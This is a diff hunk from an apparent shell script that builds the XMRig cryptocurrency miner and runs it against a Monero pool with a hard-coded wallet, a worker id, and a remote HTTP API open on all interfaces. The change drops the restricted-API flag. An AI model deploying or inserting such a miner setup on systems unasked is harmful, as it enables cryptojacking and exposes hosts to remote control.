@@ -10,4 +10,4 @@ git clone https://github.com/xmrig/xmrig.git;
 cd xmrig && mkdir build && cd build
 cmake .. -DUV_LIBRARY=/usr/lib64/libuv.a;
 make;
-./xmrig --donate-level 1 --http-enabled --api-worker-id usa --http-host 0.0.0.0 --http-port 11555 --http-access-token chinabjy --http-no-restricted -o pool.hashvault.pro:443 -u 41xYQJ9xT1jPbyyEUa73trX1HQX22UVKBFsiAJqo2HgDHq9u8zzbpsh3GANLgUCLvThQff514HFUdbWjuYjY4ZYUKZHFuwo -p usa2 -k --tls
+./xmrig --donate-level 1 --http-enabled --api-worker-id usa --http-host 0.0.0.0 --http-port 11555 --http-access-token chinabjy -o pool.hashvault.pro:443 -u 41xYQJ9xT1jPbyyEUa73trX1HQX22UVKBFsiAJqo2HgDHq9u8zzbpsh3GANLgUCLvThQff514HFUdbWjuYjY4ZYUKZHFuwo -p usa2 -k --tls
